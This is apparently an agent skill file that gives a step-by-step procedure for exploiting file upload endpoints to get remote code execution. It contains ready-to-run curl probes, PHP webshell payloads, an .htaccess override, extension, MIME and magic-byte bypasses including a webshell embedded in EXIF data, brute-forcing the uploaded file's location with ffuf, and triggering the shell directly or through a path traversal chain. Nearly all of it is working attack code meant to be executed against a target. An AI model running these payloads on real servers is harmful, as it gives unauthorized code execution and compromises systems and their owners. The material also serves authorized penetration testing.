---
name: web-file-upload
description: Bypass file upload validation to upload and execute malicious payloads. Load when the target exposes a file upload endpoint and the objective requires code execution or file write on the server.
metadata:
  requirements:
    - curl
    - exiftool
    - python3
    - ffuf
---

# File Upload Exploitation
 
File upload vulnerabilities occur when a server accepts user-supplied files without sufficiently validating their type, content, or destination. The impact depends on whether the uploaded file can be executed (either directly by the server or indirectly via LFI).
 
The process: identify the execution environment → probe which validation layers are active → craft the appropriate payload → bypass each layer → upload → locate the file → trigger execution.
 

## Identify the Execution Environment
 
What executes on the server determines what payload to craft. Technology identification should already be done via web-reconnaissance. If not, check:
 
```bash
# error page fingerprinting
curl -sk "http://$TARGET/doesnotexist" | grep -iE "(php|jsp|asp|python|ruby|node|tomcat|iis|apache|nginx)" | head -5
 
# response headers
curl -sk -I "http://$TARGET/" | grep -iE "(server|x-powered-by|set-cookie)" | head -10
```
 
If the stack is unconfirmed, fuzz executable extensions in Step 2.
 
---
 
## Probe Validation Layers
 
Send a sequence of test uploads, one per layer. Observe accept vs. reject for each. Keep output out of context by grepping responses:
 
```bash
# helper: upload a file and report status + keywords from response
probe_upload() {
  curl -sk -X POST "http://$TARGET/upload" \
    -F "file=@${1};filename=${2};type=${3}" \
    -o /tmp/probe_resp.txt -w "HTTP:%{http_code}\n"
  
  grep -ioE "(success|error|invalid|reject|not allowed|uploaded|forbidden)" /tmp/probe_resp.txt | head -3
}
```
 
### Extension validation
 
```bash
# plain executable: does the server reject based on extension alone?
probe_upload /dev/null shell.php application/octet-stream
probe_upload /dev/null shell.jsp application/octet-stream
```
 
### Content-Type (MIME) validation
 
```bash
# same extension, spoofed MIME: is Content-Type checked independently?
probe_upload /dev/null shell.php image/jpeg
```
 
### Magic bytes / content validation
 
```bash
# real image renamed to executable extension: does the server read file content?
python3 -c "open('/tmp/fake_img.jpg','wb').write(b'\xff\xd8\xff\xe0'+b'A'*16)"
probe_upload /tmp/fake_img.jpg shell.php image/jpeg
```
 
**Reading probe results:**
 
| What was accepted | Active validation layers |
|---|---|
| Only `.php` rejected, `.php+image MIME` accepted | Extension check only |
| Both rejected, real image as `.php` accepted | Extension + MIME check |
| All rejected | Magic bytes check active |
| Everything accepted | No meaningful server-side validation |
 
If you have a **whiteboard tool**, record which layers are active:
```
name: upload_validation_map
description: Validation layers active on <endpoint>: <extension|MIME|magic bytes|content>.
content: probe commands and responses per layer
```
  
## Craft the Payload
 
Craft the minimal webshell that executes a user-supplied command. Keep it short the payload needs to survive potential content inspection.
 
**Example PHP Shell**
 
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```
 
Alternate short forms if `system` is filtered:
```bash
echo '<?php passthru($_GET["cmd"]); ?>' > /tmp/shell.php
echo '<?=`$_GET[cmd]`?>' > /tmp/shell.php  # backtick execution, shortest form
```


### Server configuration file overrides
 
These allow execution even when no executable extension can be uploaded directly.
 
**Apache `.htaccess`** makes the server treat an arbitrary extension as PHP:
```bash
printf 'AddType application/x-httpd-php .rce\n' > /tmp/.htaccess
# upload .htaccess first, then upload shell.rce
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.rce
```
 
## Bypass Validation
 
Apply only the bypass techniques corresponding to the active layers identified in Step 2.
 
### Extension bypass
 
Try alternate extensions the server may execute but not blocklist:
 
```bash
# PHP
for ext in php5 phtml phar php7 shtml; do
  STATUS=$(curl -sk -X POST "http://$TARGET/upload" \
    -F "file=@/tmp/shell.php;filename=shell.${ext};type=image/jpeg" \
    -o /tmp/ext_resp.txt -w "%{http_code}")
  echo "$ext: $STATUS $(grep -ioE '(success|error|reject|upload)' /tmp/ext_resp.txt | head -1)"
done
```
 
Double extension: some servers execute based on first recognized extension:
```
shell.php.jpg     shell.jsp.png     shell.asp.gif
```
 
Case variation: if blocklist is case-sensitive:
```
shell.PHP    shell.Php    shell.pHp    shell.PhAr
```
 
Stripping bypass: if the server removes `.php` from the filename, nested sequences revert after one-pass strip:
```
shell.p.phphp     →  shell.php  (after stripping inner php)
```
 
### Content-Type (MIME) bypass
 
Spoof the `Content-Type` field in the multipart form, regardless of file content:
 
```bash
curl -sk -X POST "http://$TARGET/upload" \
  -F "file=@/tmp/shell.php;filename=shell.php;type=image/jpeg" \
  -o /tmp/resp.txt -w "HTTP:%{http_code}\n"
cat /tmp/resp.txt | grep -iE "(success|path|url|name)" | head -5
```
 
### Magic bytes bypass

If the server reads file content to verify it is a real image, the payload must begin with valid image bytes. Two approaches:
 
**Embed payload in EXIF metadata with exiftool** (cleanest, file is a valid image):
 
```bash
# start from any real JPEG or create minimal one
python3 -c "
data = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,
              0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xD9])
open('/tmp/base.jpg','wb').write(data)"
 
# embed webshell in Comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' /tmp/base.jpg -o /tmp/shell.jpg
 
# verify
exiftool /tmp/shell.jpg | grep Comment
 
# upload with executable extension
curl -sk -X POST "http://$TARGET/upload" \
  -F "file=@/tmp/shell.jpg;filename=shell.php;type=image/jpeg" \
  -o /tmp/resp.txt -w "HTTP:%{http_code}\n"
cat /tmp/resp.txt | grep -iE "(success|path|url|name)" | head -5
```
 
**Prepend magic bytes manually** (if exiftool unavailable):
 
```bash
python3 - << 'EOF'
payload = b'<?php system($_GET["cmd"]); ?>'
# JPEG magic bytes
magic = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00'
with open('/tmp/shell_magic.php', 'wb') as f:
    f.write(magic + b'\n' + payload)
EOF
```
 
## Upload and Locate the File
 
After a successful upload, the server response usually contains the file path or URL. Extract it without loading the full response:
 
```bash
cat /tmp/resp.txt | grep -iE "(path|url|href|src|file|name|location)" | head -10
```
 
If the path is not disclosed, try predictable locations:
 
```bash
FILENAME="shell.php"  # adjust to uploaded filename
for dir in /uploads /files /media /images /assets /static /tmp \
           /static/uploads /var/www/html/uploads /upload; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "http://$TARGET${dir}/${FILENAME}")
  [ "$STATUS" != "404" ] && echo "$STATUS http://$TARGET${dir}/${FILENAME}"
done
```
 
If filename was randomized, fuzz it:
 
```bash
ffuf -u "http://$TARGET/uploads/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -e .php,.jsp,.asp \
  -mc 200,403 -t 40 -s \
  -o /tmp/upload_fuzz.json -of json
 
cat /tmp/upload_fuzz.json | python3 -c \
  "import json,sys; [print(r['status'], r['url']) \
  for r in json.load(sys.stdin).get('results',[])]" | head -10
```
 
If you have a **whiteboard tool**, record the upload location:
```
name: upload_location
description: Payload accessible at <url>. Extension used: <ext>. Bypass applied: <technique>.
content: upload request, response, confirmed URL
```
 
## Trigger Execution
 
### Direct execution
 
Request the uploaded file with a benign test command first:
 
```bash
# PHP / ASP / JSP — cmd parameter
curl -sk "http://$TARGET/uploads/shell.php?cmd=id" \
  | grep -oP 'uid=\d+\([^)]+\)[^\n]+' | head -3
 
# if output is noisy, grep for command result only
curl -sk "http://$TARGET/uploads/shell.php?cmd=id" \
  | grep -v "^$" | grep -v "^<" | head -5
```
 
### Via LFI chain
 
If the upload directory is not web-accessible, chain with a path traversal vulnerability
to load the file via inclusion. See `web-path-traversal` for the full LFI process:
 
```bash
curl -sk --path-as-is \
  "http://$TARGET/?file=../../../../var/www/html/uploads/shell.php&cmd=id" \
  | grep -oP 'uid=\d+\([^)]+\)[^\n]+' | head -3
```
 
### Via configuration file override
 
If `.htaccess` or `web.config` was uploaded to remap a custom extension:
 
```bash
# upload the config file first, then the payload with the remapped extension
curl -sk -X POST "http://$TARGET/upload" \
  -F "file=@/tmp/.htaccess;filename=.htaccess;type=text/plain" \
  -o /dev/null -w "HTTP:%{http_code}\n"
 
curl -sk -X POST "http://$TARGET/upload" \
  -F "file=@/tmp/shell.rce;filename=shell.rce;type=image/jpeg" \
  -o /tmp/resp.txt -w "HTTP:%{http_code}\n"
 
# trigger
curl -sk "http://$TARGET/uploads/shell.rce?cmd=id" \
  | grep -oP 'uid=\d+\([^)]+\)[^\n]+' | head -3
```
 
If you have a **whiteboard tool**, record confirmed execution:
```
name: upload_rce_confirmed
description: RCE confirmed at <url> as <user>. Payload: <ext>. Bypass: <technique>.
content: upload request, trigger URL, confirmed command output
```
